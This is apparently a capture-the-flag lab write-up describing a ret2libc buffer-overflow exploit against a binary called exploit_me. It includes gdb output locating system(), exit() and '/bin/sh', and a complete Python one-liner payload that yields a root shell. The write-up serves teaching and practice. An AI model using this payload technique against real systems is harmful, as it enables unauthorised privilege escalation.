# Writeup 4 - Ret2LibC

## Writeups Map

![Imgur](https://i.imgur.com/io1rZpf.png)

## Summary

- [14.4 Ret2LibC](#144-ret2libc)

## Exploitation

### 14.4 Ret2LibC

> All the following steps can lead here:
>
> - [12. Getting SSH access as zaz](./Writeup1.md#12-getting-ssh-access-as-zaz)

Here we'll use the ret-to-libc technique to change the binary's execution flow by re-using existing executable code from the C standard library shared object that is already loaded and mapped into the program's virtual memory space. The return address will be overwritten with a memory address that points to the system() libc function, and we'll pass /bin/sh as the argument in order to spawn a shell. 

We need to find the addresses of system(), exit() and /bin/sh :

```text
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
(gdb) info proc map
process 2160
Mapped address spaces:

Start Addr   End Addr       Size     Offset objfile
 0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
 0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
0xb7e2b000 0xb7e2c000     0x1000        0x0 
0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
0xb7fd2000 0xb7fd5000     0x3000        0x0 
0xb7fda000 0xb7fdd000     0x3000        0x0 
0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) find 0xb7e2c000,0xb7fd2000,"/bin/sh"
0xb7f8cc58
1 pattern found.
```

We've got all that we need. We can now craft our payload. Here's the general look:

payload = padding + address of system() + return address of system() + address of "/bin/sh"

In our case, we'll have (addresses in little-endian architecture):

```text
"A" * 140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"
```

Let's run it :

```text
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print("A" * 140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�����X���
# whoami
root
```
